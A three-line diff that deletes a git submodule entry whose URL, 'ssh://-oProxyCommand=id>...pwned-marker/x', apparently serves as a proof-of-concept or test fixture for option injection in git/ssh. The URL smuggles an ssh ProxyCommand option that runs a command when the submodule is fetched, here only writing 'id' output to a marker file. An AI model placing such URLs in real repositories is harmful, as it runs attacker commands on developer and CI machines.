@@ -1,3 +1,0 @@
-[submodule "x"]
-	path = x
-	url = ssh://-oProxyCommand=id>/home/jenkins/.npm/pwned-marker/x
